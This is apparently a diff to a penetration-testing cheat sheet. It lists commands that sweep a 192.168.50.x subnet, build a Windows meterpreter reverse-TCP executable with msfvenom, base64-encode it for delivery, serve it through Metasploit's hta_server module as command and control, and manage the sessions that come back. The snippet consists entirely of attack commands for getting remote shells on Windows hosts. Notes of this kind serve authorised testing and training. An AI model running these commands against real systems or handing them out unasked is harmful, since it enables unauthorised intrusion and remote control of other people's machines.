@@ -1994,7 +1994,12 @@ for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
 ```bash
 # hundler
 msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT=1234 -f exe -o shell.exe
+## to base64 
+base64 -w0 shell.exe 
+# start handler
 use multi/handler
+## htm c2
+use exploit/windows/misc/hta_server
 # sessions
 sessions -l
 sessions -i 1
